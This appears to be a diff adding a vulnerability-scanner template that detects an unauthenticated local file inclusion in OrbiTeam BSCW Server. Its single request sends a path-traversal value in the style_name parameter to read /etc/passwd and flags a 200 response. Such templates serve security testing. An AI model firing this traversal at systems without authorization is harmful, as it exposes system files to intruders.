@@ -1,0 +1,23 @@
+id: orbiteam-bscw-server-lfi
+brief:
+    title: OrbiTeam BSCW Server - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: OrbiTeam BSCW Server versions 5.0.x, 5.1.x, 5.2.4 and below, 7.3.x and below, and 7.4.3 and below are vulnerable to unauthenticated local file inclusion.
+    label:
+        - bscw
+        - orbiteam
+        - lfi
+        - unauth
+        - packetstorm
+        - xss
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
